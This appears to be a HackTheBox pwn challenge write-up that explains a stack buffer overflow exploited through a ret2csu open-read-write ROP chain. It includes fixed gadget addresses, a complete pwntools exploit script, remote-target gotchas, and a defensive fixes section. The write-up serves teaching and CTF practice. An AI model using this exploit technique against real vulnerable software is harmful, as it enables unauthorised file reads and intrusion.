---
layout: post
title: "HackTheBox Challenge: Finale"
date: 2027-10-04 09:00:00 -0500
categories: [HackTheBox, Challenges, Pwn]
tags: [hackthebox, challenge, pwn, rop, ret2csu, orw, no-pie, stack-overflow, binary-exploitation, pwntools, cwe-121]
---

Finale is a small 64-bit pwn challenge whose flag spoils the whole trick:
`HTB{wh0_n33d5_l1bc_wh3n_u_h4v3_st4ck_l45k5}` — *who needs libc when you have stack
leaks*. It is a textbook **ret2csu open-read-write (ORW)**: a [stack-based buffer
overflow](https://cwe.mitre.org/data/definitions/121.html) in a No-PIE binary, exploited by
ROP-chaining the imported `open`/`read`/`write` to read the flag file directly — no libc address
ever needed. The interesting part isn't the chain itself; it's the three things that *only* break
on the real remote target.

## Overview

A dynamically-linked x86-64 ELF, deployed behind `socat`. `checksec`:

```
Arch:     amd64-64-little
RELRO:    Full RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
```

No PIE means every gadget, PLT stub, and GOT slot lives at a fixed, known address. There is no
`system`/`execve` in the binary, and the only infoleak is a **stack** pointer (not a libc one).
That combination points straight at ORW.

## The technique

The program has two stages:

```c
// main(): a gate
scanf("%16s", buf);
if (strncmp(buf, "s34s0nf1n4l3b00", 15) == 0)   // phrase hardcoded in .rodata
    finale();

// finale(): the bug
printf("...souvenir...: [%p]", &buf);   // leaks the STACK ADDRESS of buf
read(0, buf /* rbp-0x40 */, 0x1000);    // 0x1000 into a 0x40 buffer -> overflow
```

The gate is just a string from `.rodata` — read it out and send it back. Then `finale()` hands us
a free `%p` of `&buf` and a wildly oversized `read` into a 64-byte buffer. The saved return address
sits at **offset 72**.

Because the binary imports `open`, `read`, and `write` (all resolved under Full RELRO) and No-PIE
freezes their addresses, we never need libc: ROP an `open("flag.txt") → read(fd, scratch, n) →
write(1, scratch, n)`.

The only friction is `rdx` (the size argument) — there is no `pop rdx; ret` gadget. The universal
fix is the tail of `__libc_csu_init`:

```asm
csu_call: mov rdx, r14 ; mov rsi, r13 ; mov edi, r12d ; call [r15 + rbx*8]
pop6:     pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
```

Set `rbx=0, rbp=1` so the init loop runs exactly once, load `r12/r13/r14` → `edi/rsi/rdx` and
`r15` → a GOT slot, and pad 7 junk qwords after each call for the post-call epilogue.

## Solution

Local Kali solved instantly. The live `socat` target returned only the banner. Rebuilding the
challenge's own Docker (`ubuntu:20.04`, glibc 2.31, `socat`) reproduced the failure locally and
exposed **three remote-only gotchas** — the real lesson of the box:

1. **`csu` only sets 32-bit `edi`** (`mov edi, r12d`). Fine for a BSS address, but the filename
   is a 64-bit *stack* pointer (`0x7fff...`) — so `open`'s `rdi` is loaded with a plain
   `pop rdi; ret`, and `csu` is used only for `read`/`write`.

2. **`open()`'s own stack frame clobbers a filename placed at `buf[0]`.** Its frame grows *below*
   `rsp` (~`buf+0x70` at the call) and overwrites the first bytes of the buffer *before* the
   `openat` syscall dereferences the path. Fix: append `"flag.txt"` at the **end** of the payload
   (above `rsp`), where it survives, and point `open` at `leak + name_off`. (`strace` showed
   `openat(AT_FDCWD, "m\x8b\x15\xfa...")` — a clobbered pointer — when this was wrong.)

3. **`socat` shifts the fd and leaves blocking sockets.** Run directly, `open` returns fd 3. Under
   `socat ... fork EXEC`, the child inherits the socket on fds 3/4, so the flag lands on **fd 5** —
   and `read()` on the leftover socket fds *blocks forever*, hanging the chain after the banner.
   Fix: brute the read across fds in the order `(5,6,7,8,3)`, so the flag is emitted before the
   chain ever touches a blocking fd.

The working exploit:

```python
from pwn import *
context.binary = elf = ELF('./finale', checksec=False)

PHRASE   = b's34s0nf1n4l3b00'                 # strncmp gate (from .rodata)
OFF      = 72                                  # buf(rbp-0x40) -> saved RIP
POP_RDI  = 0x4011f2; POP_RSI = 0x4011f4; OPEN_PLT = 0x4010e0
POP6     = 0x401512; CSU_CALL = 0x4014f8
READ_GOT = 0x403250; WRITE_GOT = 0x403230; DATA = 0x404600

def csu(got, a, b, c):                         # call [got](edi=a, rsi=b, rdx=c)
    return (p64(POP6) + p64(0) + p64(1) + p64(a) + p64(b) + p64(c) + p64(got)
            + p64(CSU_CALL) + b'B' * 0x38)     # 0x38 = post-call epilogue padding

io = remote(sys.argv[1], int(sys.argv[2]))
io.sendlineafter(b'secret phrase: ', PHRASE)   # pass the gate -> finale()
io.recvuntil(b'good luck: [')                  # souvenir leak = &buf
buf = int(io.recvuntil(b']', drop=True), 16)
io.recvuntil(b'wish for next year: ')

rop  = p64(POP_RDI) + p64(0)                    # name_addr patched in after layout known
rop += p64(POP_RSI) + p64(0) + p64(OPEN_PLT)    # open(name, 0)
for fd in (5, 6, 7, 8, 3):                      # socat fd-shift + block-safe order
    rop += csu(READ_GOT, fd, DATA, 100) + csu(WRITE_GOT, 1, DATA, 100)
name = buf + OFF + len(rop)                      # filename at payload END (above rsp)
rop  = rop.replace(p64(POP_RDI) + p64(0), p64(POP_RDI) + p64(name), 1)

io.send(b'A' * OFF + rop + b'flag.txt\x00')
print(io.recvall(timeout=5))                     # HTB{...}
```

```
HTB{...}
```

## Why it worked

Full RELRO + No-PIE froze every gadget, PLT, and GOT address, and the program *handed us* a stack
leak via `%p`. A stack leak is the only missing ingredient for ORW: it tells us where the
filename we wrote into our own overflow lives. ORW with `__libc_csu_init` then synthesizes the
three-argument `open`/`read`/`write` calls with binary gadgets alone — the absence of `system` or
a libc leak is irrelevant.

## Fix / defense

- **Enable PIE** — randomizes the binary base, killing the fixed gadget/PLT/GOT addresses the whole
  technique depends on (and forcing a code leak the program never provides).
- **Don't print raw pointers** — a `%p` of a stack address is a stack/ASLR-leak primitive.
- **Bound the read** — `read(0, buf, sizeof(buf))`, never a larger constant; the bug is `0x1000`
  into a 64-byte buffer.
- A **stack canary** (`-fstack-protector-strong`) would catch the linear overflow before the
  function returns.

The transferable takeaway: when you have *any* infoleak plus a No-PIE binary that imports
`open`/`read`/`write`, you never need libc — ret2csu ORW reads the flag directly. And always test a
remote-deployed pwn against the challenge's own rebuilt Docker: fd numbering and stack-frame
clobbering differ from a bare local run, and will silently eat your exploit otherwise.
